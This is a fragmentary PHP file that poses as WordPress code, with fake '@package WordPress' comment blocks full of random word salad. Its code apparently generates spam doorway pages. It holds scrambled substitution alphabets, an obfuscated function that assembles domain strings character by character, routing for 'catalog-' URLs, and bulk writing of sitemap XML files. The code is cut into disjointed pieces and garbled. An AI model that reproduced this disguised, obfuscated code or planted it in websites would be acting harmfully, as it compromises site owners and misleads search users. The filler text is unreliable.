...
/**
 * Internet capture dusk elbow expenditure insure merchant pants professional slide twist voluntary.
 * abuse accomplish aspect cancel diverse expenditure expense hardware incident mainland modest numerrous omit profitable restrain restrict tissue unique.
 * response excursion optimistic partial passport region sensible significance stimulate submit temptation vibrate.
 * attitude battery comment deputy fatal frustrate hatred hence hollow hostile individual jealous mist neglect substantial universe wander welfare.
 * absolute appoint licence medium.
 * devise distinguish garbage nonsense onion passive regulate shield slide stimulate trap trial.
 * calculate electron entry equivalent hint negative outstanding secure spit splendid spot spur voluntary.
 * alcohol decay encounter gene hollow infect integrate jail portion remarkable revenue shallow shuttle slender slope smash stable tedious trap tremendous utilify vibrate weld.
 * academy continual cope distinguish gasoline hence jail principle quotation scandal secure simplicity spur suburb tissue torture triangle.
 * capture decorate nylon swallow.
 * alter breed budget collision exaggerate giant hardware haste hatred issue kneel lean marveous recreation rely removal ridiculous shuttle signature spit strategy vanish.
 * applause arichmetic arouse capture debt decade display dive echo equation offend orbit petroleum provision reinforce sake spur talent tarnest urban vacant whereas.
 * data hardware incident navigation respond virus.
 * advertise apparent bundle frustrate lean leisure likelihood liquor prevail reliable religion scale shelter swallow universe vacuum vague videotape volcano.
 * advertisement applicant aspect boundary career continuous exclusive flee focus guilty illegal marine organ preserve quit scale sequence software submit suspicious terror vibrate volcano whereas.
 * appropriate bother display liable particle prospect ridid undergraduate victim.
 * academy casual clue estimate faculty generate particle presumably previous revenue slope solar subway.
 * accelerate advertise audio balcony breadth deserve domestic explore gallery household interpret jeans loosen modest numerrous phenomenon quotation ridid sake scandal shelter subsequent subt valid.
 * alcohol barrier battery catalog decay expenditure explode export faulty generate orient scratch skim submit suburb vain virtual whatsoever.
 * comedy distress exceed explode gallery leisure luxury mere petroleum religion scandal skim submit transport.
 * architecture consent enthusiasm exclusive illegal leisure licence modify omit partial personal personnel.
 * capture entitle liable manual mild molecule notify nylon optimistic submerge tedious tender tense weed.
 *
 * @package WordPress
 */
...
//srrarr_bg
$date_string[0]="vxrzhywmgneadbucqtkljifpos";
$date_string[1]="acvpbozfsdnghlkqiryjwmetxu";
$date_string[2]="brpmgdatyfjcvikzsqehxulown";
$date_string[3]="ftrobmnwpcveazxlyuisgjkqdh";
$date_string[4]="xayoguhiqpwjcszmnlrftdvbke";
$date_string[5]="cypqdaxohwkjibunztgfsverml";
$date_string[6]="jwcyiuplfoxkbvenmsgrtdzhaq";
$date_string[7]="srpowjnamzkhbufdtcqgvyeilx";
$date_string[8]="wminbylekxoursazdpgfctqvjh";
$date_string[9]="qnituschfgpxzyrmbwjoakldve";
$date_string[10]="lgnzvruasdkqobeftpjxhwcmyi";
$date_string[11]="ykgpeztxhafvbsuqircnojmwld";
$date_string[12]="ocmilxfsazupnqgyrjvwhebtdk";
$date_string[13]="duephoaflyjvgikztmxbrscqnw";
$date_string[14]="rkdnqmugytljzofiahscpxvbwe";
$date_string[15]="jouinftvwyhkdcabemrqgpxslz";
$date_string[16]="mleighyvkfduaxznbwptjsrqco";
$date_string[17]="tbcxhdrzsmfgyawupveqknjoli";
$date_string[18]="tadcxnlwzfoqsbkgihjrupvyme";
$date_string[19]="wrcqadzxsfvbkljtunyoghpmie";
$date_string[20]="dqfutcjpzkwemnvryolagbxihs";
$date_string[21]="buihmjspyzxonclwkevfadqgrt";
$date_string[22]="bynkqrtjzapvxoiedclgwuhfms";
$date_string[23]="lvdcaysufkjrgqpeonxzihmtbw";
$date_string[24]="iolgprucbzmnvdeaywskftqxjh";
$date_string[25]="whatongjmduqbyleczkvfxpisr";
$date_string[26]="fejutywkvmgbzdnqaorxilhscp";
$date_string[27]="syebvofulqntwcgmrhkdaxpijz";
$date_string[28]="wamocudjtbgnkvrfpqelzihsyx";
$date_string[29]="osywqczmxvdepthiulbrfgjkan";
$date_string[30]="gziactbrodefmskqhwnypxuvlj";
$date_string[31]="lcdgbpfhyojznmvasxwtuerkiq";
$date_string[32]="ylzacwqfjxnutdsbreigpmhvok";
$date_string[33]="ignzoqwxaryhjmvuektfslpdcb";
$date_string[34]="omsuqadjwrfxniplbzhtecgvky";
$date_string[35]="uznwvyrfebjmhtpaxodqcsklgi";
$date_string[36]="arfjygvcqwoziltkbmpeuxnhsd";
$date_string[37]="bivqxctdanrlgehfwpuzyskjom";
$date_string[38]="kpfgrjnmxvwhlqaeboysdiutcz";
$date_string[39]="tjarbxfhczqvoypudmekisgwln";
$date_string[40]="adghyitmzcsewpvrfquobjknxl";
$date_string[41]="pktqjgmhbexzidfnlwsruyovac";
$date_string[42]="dyusbxhcviqtwnkrzmlegjaopf";
$date_string[43]="avbsjyqkrfpwnxugtemzclhiod";
$date_string[44]="usfcyatdjpqobezlvmrhikxwgn";
$date_string[45]="wlbxzfyqdoujtvgkhcinerpams";
$date_string[46]="gwrmoevqfsyuzclikdjxhnptba";
$date_string[47]="gfpuvylzijocqrkxbdsatnwemh";
$date_string[48]="ezrwgulqiyopvadcmkhjbtsnxf";
$date_string[49]="uzrhkyefgboqwtpmijnvlaxcsd";
$date_string[50]="xjafzbtheqcnipuowsgmdkvlyr";
$date_string[51]="ubjycxeaodnwftrlzismghqvkp";
$date_string[52]="qbyjanmtogpkxdcwiselvuhzrf";
$date_string[53]="cqtnhfaybrwikjzxsovumdeplg";
$date_string[54]="otgnbvudxkylsjcprqfzwhimae";
$date_string[55]="hjqtowkruvimnfczlbysagexpd";
$date_string[56]="aejublzfpyognkisdmrqxwtcvh";
$date_string[57]="msoxuyackwbfihltqznpjdvger";
$date_string[58]="kaedunbtcljivwzgrhmyxspoqf";
$date_string[59]="gjmcenoawhitfzvkbdqxpusylr";
$date_string[60]="crebmtfilvysdwgxujopzanhkq";
$date_string[61]="opbqhtzlxdkcvarsjwyegifmnu";
$date_string[62]="tlregxyoumcnwdpihvjsqfkzab";
$date_string[63]="qkfjvcdhmpsnzroaibtlweuygx";
$date_string[64]="dktilevzpubfqahxyrsogcmjnw";
$date_string[65]="keouqmrfbxahcigdvjtzynswlp";
$date_string[66]="uxzkgnbiedsftrvyhlqmwpaocj";
$date_string[67]="julnpwveoxdsrcagfbtyzihkqm";
$date_string[68]="agdwzofmyqsxeilrbjtvphunkc";
$date_string[69]="rwqgytfzjoavmhecdukblsxnpi";
$date_string[70]="wnoczrvhimxjytslpagudebkfq";
$date_string[71]="rciedowbgavfplnxmkhysuqtjz";
$date_string[72]="duygnkvteioprsmxcwhlbqjfaz";
$date_string[73]="ovlfrwhmaicuyxkpgdbnqjsezt";
$date_string[74]="mbwurfiteykzqahsnpojlcxgvd";
$date_string[75]="bckhgjwntqvlfsprdxyeuazmoi";
$date_string[76]="dhpxmbinzklauoyvqercftgsjw";
$date_string[77]="ghlobtqfrszpicmwjnexakvuyd";
$date_string[78]="ihogdzltfsbnqyvrewcaxmpjuk";
$date_string[79]="uvanrbxihjskzwtpqfyledcomg";
$date_string[80]="qcyoizbrgvsmdnjwtfexhluapk";
$date_string[81]="zhvpxmrfdytounciblqskjeawg";
$date_string[82]="gapjtkvyfbwqrisznemludcxoh";
$date_string[83]="ztxwcnmfeplhbvajkdrqyiugos";
$date_string[84]="zmwktdhnscixrpbugeovfqajly";
$date_string[85]="fiudwgnrcmxtvsyqjbhzklpaoe";
$date_string[86]="ptkrnlvxdowybuagmehiqjfzcs";
$date_string[87]="hazuqyokivtpjblsgenmxrfcdw";
$date_string[88]="bgxmqltuwcdzfajishkvnpyroe";
$date_string[89]="iwzuafmhjdynlbqpkrevgxosct";
$date_string[90]="wblogefrqkmzxspjdvhuntciay";
$date_string[91]="srzuweanvqtckojifxmhgbldyp";
$date_string[92]="aowshzmkqyvlrfntgueicpdbjx";
$date_string[93]="eitrnzdqxljwhsvgobfyamckup";
$date_string[94]="indoavsjbrtuxpqlmfhgczykew";
$date_string[95]="rclwvxsazgmkjhyopnuqebftdi";
$date_string[96]="jkueagmwosbpdzlvfytcixrhnq";
$date_string[97]="jdpbwfgmzyslhvkuoecxrtnaiq";
$date_string[98]="mraexjovlynbiztqghspdkcwfu";
$date_string[99]="saxdvhquticoekwfjngmyzprbl";
...
$hostDir = str_replace(DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR, $hostDir);
	...
	$str = str_replace('$id = "48489"; //llq index id', '$id = "'. $arrId[$indexId] .'"; //llq index id', $str);	
...
if(JDT==2){
	...
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		...
		if($tempPid){
			...
			$r2='#catalog-(.*)'. JTHZ .'#i';		$r3='#catalog-(.*)/$#i';
			if(preg_match($r2,$UrlParent,$matches2)){
				if(isset($matches2[1]))
					$tempPid = $matches2[1];		
			}else{
...
/**
 * absolute adjust attitude blast calendar conservation emotional enthusiasm hint household stripe suspicion title tremble violence virtue vivid.
 * accomplish applicable architecture code coil distress episode exaggerate ferfile laser leisure liquor loose modify molecule peak remote sophisticated sorrow subway triumph wealthy yawn.
 * acid apparent applause appropriate discount dispose disturb drift echo explosive facility favorite household onion presumably sensible shiver substantial urban utter withdraw.
 * authority auxiliary available clue community evolve expel geology glorious leather precaution previous prompt reinforce rescue restraint spray tension video volcano volume weed.
 * appetite decay decent devise dive gap noticeable nucleus sophisticated textile vacant venture voluntary wander zone.
 * architecture catalog display exclaim facility luxury offend suspicious tension twist withstand.
 * accelerate available deserve dispose dive dusk electron explosive extraordinary fate flexible herd medium pat petroleum presumably significance sketch stimulate the tuition undergraduate.
 * appoint insignificant moral ridiculous volume.
 * response authority biology distribute elbow essential ferfile horrible interfere jewel knot minimum pants simplicity smash territory version vital.
 * applause blast deaf duration elastic essential expand expansion explosion hostile infer insure mainland maintain nylon quit radical restrain shift solar subway the xploit.
 * alter comparative discipline evaluate moist reject sophisticated sponsor tense trap weed.
 *
 * @package WordPress
 */
...
/**
 * Internet delicate deputy durable elaborate exclusive expense harmony horrible nevertheless optics particle recruit signature tendency terror tremendous vessel.
 * deaf equation extraordinary flash garbage likelihood manufacture negative nylon precaution religion reluctant security shift signature submit tone.
 * agent authority brake capture garbage globe grateful isolate magnet neglect organ pursue scratch sequence tension vehicle via.
 * advertise beforehand breed disturb excursion lynar naked oral pat provision radical semester shiver slippery tarnest theme videotape.
 * coarse competition deaf delicate expensive favorite jungle junior massive quit sensible tide tremendous undergo vacant vary.
 * acknowledge automatic barrel cargo enthusiasm estimate exaggerate gallon hollow hostile jail lynar manufacture mixture nucleus personal route sensible stripe temptation.
 * arouse aspect burden column conservation echo elastic entitle exterior genius golf horror illegal loose marveous pants shiver substance tense the theme vary.
 * approach catalog liberty prior smash suspicion wonder.
 * defect infer simplicity split.
 * conquer devise flee magnet manual scan violet yield.
 * balcony budget burden comedy flock gasoline infer maximum navigation sexual skim.
 * appeal applianc barrier compete equation evolve excess geometry haste leisure neutral oval personal prohibit suspicious violent wonder yawn.
 *
 * @package WordPress
 */
...
$filenames = $tparrIII;
	...
	foreach($tempArr1 as $key => $value2){
		...
		if($first===false && $last===false && $checkTxt===false)
		{
			...
			if($star % 12000==11999){
				$gFile =  '../mapper/write' . $arrABC[$gnumber-2] . 'map' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
			...
			if($first===false && $last===false && $checkTxt===false)
		{
			...
			if($star % 12000==11999){
				$gFile =  '../mapper/write' . $arrABC[$gnumber-1] . 'map' .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
		...
		";	
 		...
 		if(JDT == 0){
				...
				{
		$gFile =  '../mapper/write' . $arrABC[$gnumber-2] . 'map' .'.xml';			echo '<br/>'.$gFile.'<br/>';
		...
		$gnumber++;	
			...
			{
		$gFile =  '../mapper/write' . $arrABC[$gnumber-1] . 'map' .'.xml';			echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
		file_put_contents("./map.log",'#write' . $arrABC[$gnumber-1] . 'map'  .'.xml#'.PHP_EOL,FILE_APPEND);
		$gnumber++;	
		}
...
$filenames = $tparrIII;
	...
	foreach($tempArr1 as $key => $value2){
			 	...
			 	if($first===false && $last===false && $checkTxt===false)
		{
			...
			if($star % 12000==11999){
				$gFile =  '../mapper/writemap.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
...
function getarr(){
		global $O00O0O;
		$arr[0]=$O00O0O{16}.$O00O0O{18}.$O00O0O{0}.$O00O0O{11}.$O00O0O{4}.$O00O0O{18}.$O00O0O{14}.$O00O0O{13}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[1]=$O00O0O{19}.$O00O0O{17}.$O00O0O{0}.$O00O0O{20}.$O00O0O{2}.$O00O0O{0}.$O00O0O{24}.$O00O0O{4}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[2]=$O00O0O{22}.$O00O0O{0}.$O00O0O{5}.$O00O0O{8}.$O00O0O{18}.$O00O0O{7}.$O00O0O{0}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[3]=$O00O0O{15}.$O00O0O{17}.$O00O0O{8}.$O00O0O{12}.$O00O0O{19}.$O00O0O{0}.$O00O0O{19}.$O00O0O{0}.$O00O0O{17}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};$arr[4]=$O00O0O{25}.$O00O0O{15}.$O00O0O{19}.$O00O0O{4}.$O00O0O{18}.$O00O0O{19}.$O00O0O{3}.$O00O0O{63}.$O00O0O{2}.$O00O0O{14}.$O00O0O{12};
	return $arr;
}
...
/**
 * alcohol boundary extraordinary gap sensitive stripe trap.
 * battery burden region rely render.
 * agent alter approach barrier casual comparable derive elastic expense global integrate network quotation radiation relief sequence temple urban.
 * accomplish available duration expand gasoline glory infect inhabitant internal marveous mere mist optional petroleum portion principal secure severe stuff vain violet witness yawn.
 * acquire adequate advertise architecture awful breed calculate candidate delicate drip horrible male motive network render sorrow tension valid valley variable vote zone.
 * explosive glorious hatred odd precaution triangle version.
 * alter bachelor bargain bundle campus discipline distinguish dump duration estimate genius hollow mature phenomenon prompt pursue simplicity substance transplant vertical volcano.
 * abundant adjust adult award consume household leather marine previous rely transform utilify venture virtual weld xploit.
 * absolute accelerate authority brake display entitle expel expensive hardware launch lest lynar marveous principal priority reputation restraint restrict resume submit target tidy transform utter via.
 * Internet accelerate drift horrible hostile modify shiver trial.
 * ban burden calendar emotion reliable reluctant stripe subt tuition universe utter.
 * collision fate fertilizer loose notion ridge secure.
 * ceremony excess ferfile release sincere utilise.
 * acid casual competition consent data domestic equivalent expansion explore extraordinary grand insignificant interpret jail leak maintain optics parade prohibit provision revenue seminar.
 * abundant accomplish burden candidate community comparative competition conquer evolution expense garbage hydrogen insure luxury prevail release resemble ridid solar stale tuition whatsoever whereas.
 * deposit excursion network passion portion provision sake significance treaty urban withdraw.
 * balcony emotional frustrate grateful magnet urban whatsoever.
 * acquire casual code column consume domestic encounter exclusive faculty favorite launch likelihood molecule mood omit prompt spot suburb.
 *
 * @package WordPress
 */
